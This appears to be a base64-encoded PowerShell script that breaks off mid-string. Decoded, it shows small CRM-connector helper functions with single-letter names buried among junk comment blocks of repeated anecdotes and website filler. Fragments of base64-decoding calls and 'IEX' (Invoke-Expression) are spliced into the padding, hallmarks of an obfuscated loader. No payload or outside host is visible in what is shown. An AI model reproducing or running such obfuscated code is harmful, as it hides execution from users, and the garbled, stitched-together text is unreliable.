25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KZnVuY3Rpb24gdyB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUEFSQU0oIAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW3N0cmluZ10kZmlsZVBhdGgKICAgICkKICAgICRsb2dmaWxlbmFtZSA9ICJNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLlZlcmJvc2UubG9nIgogICAgaWYoLW5vdCBbc3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkZmlsZVBhdGgpKXsKICAgICAgICAkbG9nZmlsZW5hbWUgPSAiJGZpbGVQYXRoXCRsb2dmaWxlbmFtZSIKICAgIH0KICAgIFdyaXRlLVZlcmJvc2UgIkVuYWJsaW5nIE1pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IgdmVyYm9zZSBsb2dnaW5nIHRvICRsb2dmaWxlbmFtZSIKICAgIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLlRyYWNlQ29udHJvbFNldHRpbmdzXTo6VHJhY2VMZXZlbCA9IFtTeXN0ZW0uRGlhZ25vc3RpY3MuU291cmNlTGV2ZWxzXTo6QWxsCiAgICBpZigtbm90IFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLlRyYWNlQ29udHJvbFNldHRpbmdzXTo6QWRkVHJhY2VMaXN0ZW5lcigoTmV3LU9iamVjdCBTeXN0ZW0uRGlhZ25vc3RpY3MuVGV4dFdyaXRlclRyYWNlTGlzdGVuZXIgLUFyZ3VtZW50TGlzdCAkbG9nZmlsZW5hbWUpKSl7CiAgICAgICAgV3JpdGUtV2FybmluZyAiTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5UcmFjZUNvbnRyb2xTZXR0aW5nc106OkFkZFRyYWNlTGlzdGVuZXIgZm9yIGFsbCBsZXZlbHMgZmFpbGVkLiIKICAgIH0KfQo8Iz4+ClNwPWVsbGluZyBhbmQgYygpClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIGMoKSBvciBwcmFjdGljZSBmb3IgcigpIGJlZXMuIElmIGFuIHEoKSB3b3JkIG8oKSwgcCgpIHVwIHRoZSBtZWFuaW5nIHdpbGwgaGVscCBzdHVkZW50cyBpbmNyZWFzZSB0aGUgbnVtYmVyIG9mIHdvcmRzIHRoZXkga25vdy4gV29ya2luZyB3aXRoIGEgcGFydG5lciwgc3R1ZGVudHMgY2FuIHRlc3QgZWFjaCBvdGhlciBvbiB0aGUgcigpIGZvciB0aGUgcmFuZG9taXplZCB3b3JkcyBtKClkLgoKTmFtZSBJbnNwaXJhdGlvbgpJZiB5b3UgbmVlZCB0byBjcmVhdGUgYSBuYW1lIGZvciBhIHByb2R1Y3QsIGFuIGV2ZW50LCBhIGJhbmQgb3IgZm9yIGFueXRoaW5nIGVsc2UsIHRoaXMgdG9vbCBjYW4gYmUgcXVpdGUgaGVscGZ1bC4gQXMgeW91IGNvbnNpZGVyIG5hbWVzLCBtKCkgYSBudW1iZXIgb2YgcmFuZG9tIHdvcmRzIGFuZCBzZWUgaG93IHRoZXkgaW1wYWN0IHdoYXQgeW91IGhhdmUgYWxyZWFkeSBjb21lIHVwIHdpdGguIElucHV0dGluZyB1bmlxdWUgd29yZHMgeW91IG1heSBub3QgaGF2ZSBjb25zaWRlcmVkIGNhbiBzcGFyayBhZGRpdGlvbmFsIGNyZWF0aXZpdHkgdG8gZXZlbnR1YWxseSBoZWxwIHlvdSBwcm9kdWNlIHRoZSBwZXJmZWN0IG5hbWUgZm9yIHlvdXIgcHJvamVjdC4gSWYgeW91J3JlIHAoKSBmb3IgZ29vZCBjaGFyYWN0ZXIgbmFtZXMgb3IgYmFieSBuYW1lcywgeW91IG1pZ2h0IGJlIGludGVyZXN0ZWQgaW4gb3VyIHJhbmRvbSBuYW1lIGdlbmVyYXRvci4KClRoZSBhYm92ZSBsaXN0IGlzIG5vdCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC4gVGhlcmUgYXJlIGxpdGVyYWxseSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBvZiB3YXlzIHRoZSBSYW5kb20gV29yZCBHZW5lcmF0b3IgY2FuIGJlIHVzZWQuIFBsZWFzZSBmZWVsIGZyZWUgdG8gc2hhcmUgdGhlIHdheSB5b3UgdXNlIHRoaXMgdG9vbCwgYW5kIHdlIGFsd2F5cyB3ZWxjb21lIHN1Z2dlc3Rpb25zIG9uIGhvdyB3ZSBjYW4gaW1wcm92ZSBpdCB0byBzZXJ2ZSB5b3UgYmV0dGVyLiBXZSBhcmUgYWxzbyBpbnRlcmVzdGVkIGluIG5ldyB3b3JkIGdlbmVyYXRvcnMgeW91J2QgYmUgaW50ZXJlc3RlZCBpbiB1cyBjcmVhdGluZy4gTWFueSBvZiB0aGUgdG9vbHMgb24gdGhpcyB3ZWJzaXRlIGNhbWUgZnJvbSBpZGVhcyBmcm9tIHBlb3BsZSBsaWtlIHlvdSB3aG8gY29udGFjdGVkIHVzLiBQbGVhc2UgdGFrZSB0aGUgdGltZSB0byBleHBsb3JlIHRoZSBvdGhlciByYW5kb20gZ2VuZXJhdG9ycyB3ZSBoYXZlIGF2YWlsCgojPjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIG4oKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIHNvbWUgZ3JhZCBzdHVkZW50cyB3ZSBqKCkgZm9yIGFuIGYoKSBwcm9ncmFtLiBBZnRlciB3ZSBoYWQgYWxsIGhhZCBrKCkgZHJpbmtzLCBvbmUgb2YgdGhlIHN0dWRlbnRzIHNhaWQgdGhleSBkb250IGxpa2Ugc21va2VzIGJlY2F1c2UgdGhleSB0YXN0ZSBsaWtlIGEuIE15IGJvc3MgcmVwbGllZCwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBzbW9rZXMuIFNvIEkgY3V0IGluLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIGEuIEkgd2FzIGFza2VkIHRvIGxlYXZlLuKAnVNvdXJjZSM+CjwjVGhhdHMgRGVkaWNhdGlvblNvdXJjZSBPbmUgdGltZSBJIGF0ZSAyNiBjaG9jb2xhdGUgY2hpcCBpKCkgYmVjYXVzZSBJIHdhcyBtYWQgYXQgbXkgbGl0dGxlIGwoKSBhbmQgZGlkbnQgd2FudCBoZXIgdG8gaGF2ZSBhbnkuIEkgcHVrZWQgYWxsIG92ZXIgdGhlIHBsYWNlLuKAnSBTb3VyY2UjPgo8I+KAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgpmdW5jdGlvbiB4IHsKICAgIFdyaXRlLVZlcmJvc2UgIkNhbGxpbmc6IFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLlRyYWNlQ29udHJvbFNldHRpbmdzXTo6Q2xvc2VMaXN0ZW5lcnMoKSIKICAgIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLlRyYWNlQ29udHJvbFNldHRpbmdzXTo6Q2xvc2VMaXN0ZW5lcnMoKQp9CjwjPj4KU3A9ZWxsaW5nIGFuZCBjKCkKVGhpcyB0b29sIGNhbiBiZSBhbiBleGNlbGxlbnQgd2F5IHRvIGltcHJvdmUgYygpIG9yIHByYWN0aWNlIGZvciByKCkgYmVlcy4gSWYgYW4gcSgpIHdvcmQgbygpLCBwKCkgdXAgdGhlIG1lYW5pbmcgd2lsbCBoZWxwIHN0dWRlbnRzIGluY3JlYXNlIHRoZSBudW1iZXIgb2Ygd29yZHMgdGhleSBrbm93LiBXb3JraW5nIHdpdGggYSBwYXJ0bmVyLCBzdHVkZW50cyBjYW4gdGVzdCBlYWNoIG90aGVyIG9uIHRoZSByKCkgZm9yIHRoZSByYW5kb21pemVkIHdvcmRzIG0oKWQuCgpOYW1lIEluc3BpcmF0aW9uCklmIHlvdSBuZWVkIHRvIGNyZWF0ZSBhIG5hbWUgZm9yIGEgcHJvZHVjdCwgYW4gZXZlbnQsIGEgYmFuZCBvciBmb3IgYW55dGhpbmcgZWxzZSwgdGhpcyB0b29sIGNhbiBiZSBxdWl0ZSBoZWxwZnVsLiBBcyB5b3UgY29uc2lkZXIgbmFtZXMsIG0oKSBhIG51bWJlciBvZiByYW5kb20gd29yZHMgYW5kIHNlZSBob3cgdGhleSBpbXBhY3Qgd2hhdCB5b3UgaGF2ZSBhbHJlYWR5IGNvbWUgdXAgd2l0aC4gSW5wdXR0aW5nIHVuaXF1ZSB3b3JkcyB5b3UgbWF5IG5vdCBoYXZlIGNvbnNpZGVyZWQgY2FuIHNwYXJrIGFkZGl0aW9uYWwgY3JlYXRpdml0eSB0byBldmVudHVhbGx5IGhlbHAgeW91IHByb2R1Y2UgdGhlIHBlcmZlY3QgbmFtZSBmb3IgeW91ciBwcm9qZWN0LiBJZiB5b3UncmUgcCgpIGZvciBnb29kIGNoYXJhY3RlciBuYW1lcyBvciBiYWJ5IG5hbWVzLCB5b3UgbWlnaHQgYmUgaW50ZXJlc3RlZCBpbiBvdXIgcmFuZG9tIG5hbWUgZ2VuZXJhdG9yLgoKVGhlIGFib3ZlIGxpc3QgaXMgbm90IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLiBUaGVyZSBhcmUgbGl0ZXJhbGx5IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIG9mIHdheXMgdGhlIFJhbmRvbSBXb3JkIEdlbmVyYXRvciBjYW4gYmUgdXNlZC4gUGxlYXNlIGZlZWwgZnJlZSB0byBzaGFyZSB0aGUgd2F5IHlvdSB1c2UgdGhpcyB0b29sLCBhbmQgd2UgYWx3YXlzIHdlbGNvbWUgc3VnZ2VzdGlvbnMgb24gaG93IHdlIGNhbiBpbXByb3ZlIGl0IHRvIHNlcnZlIHlvdSBiZXR0ZXIuIFdlIGFyZSBhbHNvIGludGVyZXN0ZWQgaW4gbmV3IHdvcmQgZ2VuZXJhdG9ycyB5b3UnZCBiZSBpbnRlcmVzdGVkIGluIHVzIGNyZWF0aW5nLiBNYW55IG9mIHRoZSB0b29scyBvbiB0aGlzIHdlYnNpdGUgY2FtZSBmcm9tIGlkZWFzIGZyb20gcGVvcGxlIGxpa2UgeW91IHdobyBjb250YWN0ZWQgdXMuIFBsZWFzZSB0YWtlIHRoZSB0aW1lIHRvIGV4cGxvcmUgdGhlIG90aGVyIHJhbmRvbSBnZW5lcmF0b3JzIHdlIGhhdmUgYXZhaWwKCiM+PCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxJIHdhcyBhdCBhIHN3YW5rIGJhciBmb3IgYSB3b3JrIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBzb21lIGdyYWQgc3R1ZGVudHMgd2UgaigpIGZvciBhbiBmKCkgcHJvZ3JhbS4gQWZ0ZXIgd2UgaGFkIGFsbCBoYWQgaygpIGRyaW5rcywgb25lIG9mIHRoZSBzdHVkZW50cyBzYWlkIHRoZXkgZG9udCBsaWtlIHNtb2tlcyBiZWNhdXNlIHRoZXkgdGFzdGUgbGlrZSBhLiBNeSBib3NzIHJlcGxpZWQsIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2Qgc21va2VzLiBTbyBJIGN1dCBpbiwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBhLiBJIHdhcyBhc2tlZCB0byBsZWF2ZS7igJ1Tb3VyY2UjPgo8I1RoYXRzIERlZGljYXRpb25Tb3VyY2UgT25lIHRpbWUgSSBhdGUgMjYgY2hvY29sYXRlIGNoaXAgaSgpIGJlY2F1c2UgSSB3YXMgbWFkIGF0IG15IGxpdHRsZSBsKCkgYW5kIGRpZG50IHdhbnQgaGVyIHRvIGhhdmUgYW55LiBJIHB1a2VkIGFsbCBvdmVyIHRoZSBwbGFjZS7igJ0gU291cmNlIz4KPCPigJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KZnVuY3Rpb24geSB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUEFSQU0oIAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1TZXJ2aWNlQ2xpZW50XSRjb25uCiAgICApCiAgICB0cnl7CiAgICAgICAgJGRlZmF1bHRQcm9wc0NybVNlcnZpY2VDbGllbnQgPSBAKAogICAgICAgICAgICAnSXNSZWFkeScsCiAgICAgICAgICAgICdJc0JhdGNoT3BlcmF0aW9uc0F2YWlsYWJsZScsCiAgICAgICAgICAgICdNYXhSZXRyeUNvdW50JywKICAgICAgICAgICAgJ1JldHJ5UGF1c2VUaW1lJywgCiAgICAgICAgICAgICdBdXRob3JpdHknLAogICAgICAgICAgICAnQWN0aXZlQXV0aGVudGljYXRpb